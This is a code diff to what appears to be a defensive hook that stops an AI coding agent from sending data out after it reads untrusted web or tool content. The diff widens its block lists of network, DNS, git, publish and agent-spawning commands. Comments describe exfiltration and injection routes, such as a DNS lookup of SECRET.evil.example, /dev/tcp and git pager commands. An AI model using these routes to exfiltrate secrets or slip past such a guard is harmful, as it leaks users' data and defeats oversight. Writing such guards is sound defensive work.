@@ -21,7 +21,7 @@ const words = (args: readonly string[], valued = /(?!)/) =>
 const first = (args: readonly string[], valued?: RegExp) => words(args, valued)[0] ?? ''
 
 // The commands that fetch a page: the reads that taint a session from the shell.
-const FETCH = bin('curl|wget|Invoke-WebRequest|iwr|Invoke-RestMethod|irm')
+const FETCH = bin('curl|wget|aria2c|http|https|xh|lynx|w3m|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|Start-BitsTransfer')
 const AWS_VALUE = /^--(profile|region|output|query|color|ca-bundle|cli-read-timeout|cli-connect-timeout|cli-binary-format)$/
 const AWS_READ = /^((get|list|describe|head|lookup|filter|batch-get)-[\w-]*|scan|query|ls|tail|wait|help)$/
 const GH_READ = /^(view|list|status|checks|diff)$/
@@ -31,7 +31,9 @@ const GH_API_WRITE = /^(--method|--field|--raw-field|--input|--hostname)(=|$)|^-
 // --admin is refused too: it merges past branch protection.
 const GH_MERGE_UNSAFE = /^--(admin|body|body-file|subject|author-email)(=|$)|^-[^-]*[bFtA]|^(?!https:\/\/github\.com\/).*:\/\//
 // Settings that point gh at another host, wherever the line sets them (VAR=x prefix, env, $env:).
-const GH_OTHER_HOST = /GH_HOST|ENTERPRISE_TOKEN/i
+const GH_OTHER_HOST = /GH_HOST|GH_REPO|ENTERPRISE_TOKEN/i
+// A repo or URL on another host (-R evil.example/o/r, https://evil.example/o/r/pull/1): gh sends the call there, whatever the verb.
+const GH_OTHER_REPO = /^(?!https:\/\/github\.com\/).*:\/\/|^(-R|--repo=)?(?!github\.com\/)[\w-]+(\.[\w-]+)+(:\d+)?\/[^/\s]+\/[^/\s]+/
 const GH = bin('gh')
 
 // A gh call's group and verb by position, so an option's value (--template list) cannot stand in for a verb.
@@ -54,8 +56,16 @@ const REMOTE = /:\/\/|::|^[^\s/\\:@]+@[^\s/\\:]+:|^([^\s/\\:@]+\.[^\s/\\:@]+|loc
 // An image or module named by its host (evil.example/x, localhost:5000/x): docker and go fetch from that host.
 const HOSTED = /^([\w-]+(\.[\w-]+)+|localhost)(:\d+)?\//
 // Settings that point an installer at another index, registry, proxy or daemon, wherever the line sets them.
-const INSTALL_HOST = /PIP_(EXTRA_)?INDEX_URL|PIP_FIND_LINKS|UV_(EXTRA_|DEFAULT_)?INDEX|NPM_CONFIG_REGISTRY|GOPROXY|DOCKER_HOST/i
+const INSTALL_HOST =
+  /PIP_(EXTRA_)?INDEX_URL|PIP_FIND_LINKS|UV_(EXTRA_|DEFAULT_)?INDEX|NPM_CONFIG_REGISTRY|YARN_(NPM_)?REGISTRY|BUN_CONFIG_REGISTRY|COREPACK_NPM_REGISTRY|GOPROXY|GOSUMDB|DOCKER_HOST/i
 const GIT_VALUE = /^(-C|-c|--git-dir|--work-tree|--namespace)$/
+// Config and options that make git run a program or send through a proxy: an alias, a transport, helper or pager command.
+// A pager or editor set to cat, true or less is how a pager is turned off, and stays.
+const GIT_RUNS =
+  /^(alias\.|core\.(sshcommand|fsmonitor|hookspath|gitproxy|askpass)|credential\.|diff\.external|http\S*\.proxy|--(upload-pack|receive-pack|exec)\b)|^(core\.(pager|editor)|sequence\.editor|pager\.\w+)=(?!(cat|true|less|:)?$)/i
+const GIT_RUNS_ENV = /GIT_(SSH|PROXY_COMMAND|ASKPASS|EXTERNAL_DIFF|CONFIG_\w+)|GIT_(PAGER|(SEQUENCE_)?EDITOR)=(?!["']?(cat|true|less|:)?["']?(\s|$))/
+// certutil hashes and decodes files locally; only its URL options fetch.
+const isCertutilFetch = (args: readonly string[]) => args.some(arg => /urlcache|verifyctl|^-ping|https?:/i.test(arg))
 
 // An MCP tool whose action only reads, by name: on a server TAINT_GUARD_READ_SERVERS names, it still taints but is not a sink.
 // shortcut: by tool name, and the call's arguments still reach that server; list only servers whose operator is not an attacker (first-party connectors, the app's own tools).
@@ -69,26 +79,46 @@ const anyOf = (verbs: RegExp) => (args: readonly string[]) => words(args).some(w
 const SINKS: readonly (readonly [string, RegExp, (args: readonly string[], command: string) => boolean])[] = [
   [
     'a network tool',
-    bin('curl|wget|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|Send-MailMessage|Start-BitsTransfer|bitsadmin'),
+    bin(
+      'curl|wget|aria2c|http|https|xh|lynx|w3m|nc|ncat|netcat|socat|telnet|ssh|scp|sftp|rsync|ftp|tftp|plink|pscp|psftp|ssh-keyscan|ssh-copy-id|rclone|smbclient|finger|mail|mailx|sendmail|mshta|Invoke-WebRequest|iwr|Invoke-RestMethod|irm|Send-MailMessage|Start-BitsTransfer|bitsadmin|New-PSSession|Enter-PSSession',
+    ),
     args => !isAbout(args),
   ],
   // A lookup sends the name it asks for to the attacker's DNS server (SECRET.evil.example), so it is a sink like curl.
   [
     'a DNS or ping tool',
-    bin('nslookup|dig|host|drill|ping|ping6|tracert|traceroute|tracepath|pathping|mtr|Resolve-DnsName|Test-NetConnection|tnc|Test-Connection'),
+    bin('nslookup|dig|host|drill|whois|nmap|ping|ping6|tracert|traceroute|tracepath|pathping|mtr|Resolve-DnsName|Test-NetConnection|tnc|Test-Connection'),
     args => !isAbout(args),
   ],
-  // certutil hashes and decodes files locally; only its URL options fetch.
-  ['a network tool', bin('certutil'), args => args.some(arg => /urlcache|verifyctl|^-ping|https?:/i.test(arg))],
+  ['a network tool', bin('certutil'), isCertutilFetch],
+  // openssl works on local files but for the subcommands that open a connection.
+  ['a network tool', bin('openssl'), args => /^(s_client|s_time|ocsp)$/.test(args[0] ?? '')],
   // shortcut: az and gcloud are refused whole, upgrade to a read list like aws's if they are used in tainted sessions.
   ['az or gcloud', bin('az|gcloud'), () => true],
-  ['git push', bin('git'), args => /^(push|send-email|request-pull)$/.test(first(args, GIT_VALUE))],
+  // send-pack and http-push are the push underneath; subtree and lfs carry a push of their own. stash push is local.
+  [
+    'git push',
+    bin('git'),
+    args =>
+      /^(push|send-pack|http-push|send-email|imap-send|request-pull|svn|p4)$/.test(first(args, GIT_VALUE)) ||
+      (/^(subtree|lfs)$/.test(first(args, GIT_VALUE)) && anyOf(/^push$/)(args)),
+  ],
+  // Reading a key (git config alias.x) sets nothing; a value after it, or -c key=value, does.
+  [
+    'a git call that runs another program',
+    bin('git'),
+    (args, command) =>
+      GIT_RUNS_ENV.test(command) ||
+      args.some((arg, i) => GIT_RUNS.test(arg) && (/=|^--/.test(arg) || words(args.slice(i + 1)).length > 0)),
+  ],
   // The URL itself carries data (git clone https://evil.example/SECRET), whatever the call does with it.
   // Plain git fetch and pull stay allowed: they reach only the remotes already in the repo's config, which the model did not pick from a page.
   [
     'a git call to another host',
     bin('git'),
-    args => /^(clone|fetch|pull|ls-remote|remote|submodule|config|archive)$/.test(first(args, GIT_VALUE)) && args.some(arg => REMOTE.test(arg)),
+    args =>
+      /^(clone|fetch|pull|ls-remote|remote|submodule|config|archive|fetch-pack|http-fetch|lfs)$/.test(first(args, GIT_VALUE)) &&
+      args.some(arg => REMOTE.test(arg)),
   ],
   // An install from a URL, or with its index or registry pointed elsewhere, asks that host for the address.
   // python and npx are here too: python -m pip, and a script or package run straight from a URL.
@@ -104,7 +134,13 @@ const SINKS: readonly (readonly [string, RegExp, (args: readonly string[], comma
     (args, command) =>
       INSTALL_HOST.test(command) ||
       args.some(arg => REMOTE.test(arg)) ||
-      (anyOf(/^(get|install|run|pull|create)$/)(args) && args.some(arg => HOSTED.test(arg))),
+      (anyOf(/^(get|install|run|pull|create|download)$/)(args) && args.some(arg => HOSTED.test(arg))),
+  ],
+  // Other installers and runners, when handed a URL: cargo install --git, gem --source, deno run, kubectl apply -f, node -e "fetch(...)".
+  [
+    'a call to another host',
+    bin('cargo|gem|deno|node|uvx|kubectl|oc|helm|conda|mamba|poetry|pdm|composer|dotnet|nuget|choco|winget|scoop|brew|ruby|perl|php'),
+    args => args.some(arg => /:\/\//.test(arg)),
   ],
   [
     'a gh call that writes',
@@ -112,39 +148,91 @@ const SINKS: readonly (readonly [string, RegExp, (args: readonly string[], comma
     (args, command) => {
       const [group, verb] = ghVerbs(args)
 
-      const isApiGet = group === 'api' && !GH_OTHER_HOST.test(command) && !args.some(arg => GH_API_WRITE.test(arg))
+      const isApiGet = group === 'api' && !args.some(arg => GH_API_WRITE.test(arg))
 
       // shortcut: a merge changes the repo, so an injection can ask for one; it stays behind the repo's branch protection and required checks.
-      const isMerge = group === 'pr' && verb === 'merge' && !GH_OTHER_HOST.test(command) && !args.some(arg => GH_MERGE_UNSAFE.test(arg))
+      const isMerge = group === 'pr' && verb === 'merge' && !args.some(arg => GH_MERGE_UNSAFE.test(arg))
 
-      return !(group === 'status' || isApiGet || isMerge ||(group === 'auth' && verb === 'status') || (group !== 'api' && GH_READ.test(verb ?? '')))
+      // A read sent to another host carries its arguments there, so the host is checked for every call.
+      return (
+        GH_OTHER_HOST.test(command) ||
+        args.some(arg => GH_OTHER_REPO.test(arg)) ||
+        !(group === 'status' || isApiGet || isMerge || (group === 'auth' && verb === 'status') || (group !== 'api' && GH_READ.test(verb ?? '')))
+      )
     },
   ],
   [
     'an AWS call that writes',
     bin('aws'),
-    args => {
+    (args, command) => {
       const [service, operation] = words(args, AWS_VALUE)
 
-      // --en: the CLI takes an abbreviated --endpoint-url too.
-      return args.some(arg => arg.startsWith('--en')) || service === 'configure' || !AWS_READ.test(operation ?? 'help')
+      // The CLI takes --endpoint-url abbreviated down to --e, and from the environment.
+      return (
+        /AWS_ENDPOINT_URL/i.test(command) ||
+        args.some(arg => /^--e/.test(arg) && '--endpoint-url'.startsWith(arg.split('=')[0] ?? '')) ||
+        service === 'configure' ||
+        !AWS_READ.test(operation ?? 'help')
+      )
     },
   ],
-  ['terraform apply', bin('terraform|tofu|terragrunt'), args => /^(apply|destroy|import|state|force-unlock|taint|untaint|login)$/.test(first(args))],
-  ['a package publish', bin('npm|pnpm|yarn|bun'), anyOf(/^(publish|unpublish|deprecate|dist-tag|owner|login|adduser)$/)],
-  ['a package publish', bin('twine|uv|cargo|gem'), anyOf(/^(upload|publish|push|login)$/)],
-  ['an image push', bin('docker|podman'), args => anyOf(/^(push|login)$/)(args) || args.includes('--push')],
+  // Anywhere among the bare words, so terragrunt run-all apply counts. init fetches a module or backend from the address it is given.
+  [
+    'terraform apply',
+    bin('terraform|tofu|terragrunt'),
+    args =>
+      anyOf(/^(apply|destroy|import|state|force-unlock|taint|untaint|login|refresh|apply-all|destroy-all)$/)(args) ||
+      (anyOf(/^workspace$/)(args) && anyOf(/^(new|delete)$/)(args)) ||
+      (anyOf(/^init$/)(args) && args.some(arg => /^-from-module/.test(arg) || REMOTE.test(arg))),
+  ],
+  [
+    'a kubectl or helm call that writes',
+    bin('kubectl|oc|helm'),
+    anyOf(
+      /^(apply|create|delete|replace|patch|edit|exec|run|cp|scale|rollout|set|label|annotate|expose|drain|cordon|uncordon|taint|attach|debug|port-forward|proxy|install|upgrade|uninstall|rollback|push|login)$/,
+    ),
+  ],
+  // npm takes a command by its prefix: npm pub is npm publish.
+  ['a package publish', bin('npm|pnpm|yarn|bun'), anyOf(/^(pub(l\w*)?|unpub\w*|deprecate|dist-tags?|owner|login|adduser)$/)],
+  ['a package publish', bin('twine|uv|cargo|gem|poetry|hatch|flit|pdm|vsce'), anyOf(/^(upload|publish|push|login)$/)],
+  // dotnet publish builds into a local folder; only nuget push uploads.
+  ['a package publish', bin('dotnet|nuget'), anyOf(/^push$/)],
+  ['a package publish', bin('python|python3|py'), args => args.includes('twine')],
+  ['an image push', bin('docker|podman'), args => anyOf(/^(push|login)$/)(args) || args.some(arg => /^--push$|push=true|type=registry/.test(arg))],
+  // A session started from the shell is not tainted, so whatever it is asked to run would run. plugin test and validate run no model.
+  [
+    'starting another agent session',
+    bin('claude|codex'),
+    args => !isAbout(args) && !(args[0] === 'plugin' && /^(test|validate|list)$/.test(args[1] ?? '')),
+  ],
+]
+
+// Sends that are no program's argument, read off the whole line: bash's /dev/tcp, a .NET socket or web client, a share on another
+// host (SMB or WebDAV, and the name alone is a DNS lookup), a proxy variable, and a URL handed to the browser.
+const NET_CLASS = /\bNet\.(WebClient|WebRequest|HttpWebRequest|Http|Sockets|Mail|Dns|NetworkInformation)\b/i
+const LINE_SINKS: readonly (readonly [string, RegExp])[] = [
+  ['a network redirection', /\/dev\/(tcp|udp)\//],
+  ['a .NET network call', NET_CLASS],
+  ['a path on another host', /(^|[\s"'=(,;])(\\{2,4}|\/\/)(?!wsl\.localhost)[\w.-]+\.[\w-]+(@\w+)?[\\/]/],
+  ['a proxy setting', /\w*_PROXY\s*=/i],
+  [
+    'opening a URL',
+    /(^|[;&|({"']\s*|\/[ck]\s+)(start|start-process|saps|explorer|xdg-open|open|wslview|rundll32|msedge|chrome|firefox)(\.exe)?\s[^|;&\n]*:\/\//i,
+  ],
 ]
 
 // The first call in a command line that sends or publishes, by name.
-const sinkIn = (command: string) => SINKS.find(([, binary, isSink]) => invocations(command, binary).some(args => isSink(args, command)))?.[0]
+const sinkIn = (command: string) =>
+  SINKS.find(([, binary, isSink]) => invocations(command, binary).some(args => isSink(args, command)))?.[0] ??
+  LINE_SINKS.find(([, shape]) => shape.test(command))?.[0]
 
 // Bash drops a backslash before a letter (git pu\sh is git push), so the line is read with and without them; only PowerShell is known not to.
 const sink = (command: string, tool: string) =>
   sinkIn(command) ?? (tool === 'PowerShell' ? undefined : sinkIn(command.replace(/\\(?=[A-Za-z])/g, '')))
 
-// A path part or host label that reads as encoded data (base64, hex, a token), not a word slug.
-const DATA = /^(?=.*\d)(?=.*[A-Za-z])[A-Za-z0-9+/=_%]{24,}$/
+// A run in a path part or host label that reads as encoded data (base64, hex, a token), not a word slug.
+// Unanchored, so one character from outside the run (TOKEN~, a;TOKEN) does not hide it.
+const DATA = /(?=[A-Za-z0-9+/=_%]*\d)(?=[A-Za-z0-9+/=_%]*[A-Za-z])[A-Za-z0-9+/=_%]{24,}/
 // On a code host a hex part is a commit or gist id, and the host does not show its request paths to whoever asked for the fetch.
 const CODE_HOST = /(^|\.)(github\.com|githubusercontent\.com|gitlab\.com|bitbucket\.org)$/
 const HEX = /^[0-9a-f]+$/i
@@ -280,7 +368,10 @@ const reads = (e: { tool: string; [key: string]: unknown }, isTrusted: boolean):
   // Before the MCP check: the terminal tool's command is read even when its server is trusted.
   if (
     SHELL_TOOLS.includes(e.tool) &&
-    (invocations(commandOf(e), FETCH).some(args => !isAbout(args)) || invocations(commandOf(e), GH).some(isGhUntrusted))
+    (invocations(commandOf(e), FETCH).some(args => !isAbout(args)) ||
+      invocations(commandOf(e), GH).some(isGhUntrusted) ||
+      invocations(commandOf(e), bin('certutil')).some(isCertutilFetch) ||
+      NET_CLASS.test(commandOf(e)))
   ) {
     return `${e.tool} ${commandOf(e).slice(0, 80)}`
   }
@@ -298,6 +389,11 @@ const sends = (e: { tool: string; [key: string]: unknown }, isTrusted: boolean):
   if (e.tool === 'WebFetch') {
     // A host TAINT_GUARD_TRUSTED_HOSTS names is not an attacker's.
     return !isTrusted && carriesData(e.url) ? 'a WebFetch that carries data in its URL' : undefined
+  }
+
+  // A scheduled or remote run starts in a session that is not tainted, so its prompt would run there unchecked.
+  if (/^(CronCreate|RemoteTrigger)$/.test(e.tool)) {
+    return 'a scheduled or remote run'
   }
 
   // Before the MCP check: the terminal tool's command is read even when its server is trusted.
@@ -347,7 +443,9 @@ export const register: Register = on => {
 
   // A deny, not an ask: in auto mode an ask is settled by the classifier, not the person.
   on('tool.call', async ($, e, next) => {
-    const call = e as unknown as { tool: string; [key: string]: unknown }
+    const raw = e as unknown as { tool: string; [key: string]: unknown }
+    // A resource read or listing is a call to its MCP server under a built-in tool's name: judged as that server's read tool.
+    const call = /^(List|Read)McpResource/.test(raw.tool) ? { ...raw, tool: `mcp__${String(raw.server ?? '')}__read_resource` } : raw
     const isTrusted =
       call.tool === 'WebFetch'
         ? isTrustedUrl(call.url, await $.env.get('TAINT_GUARD_TRUSTED_HOSTS'))
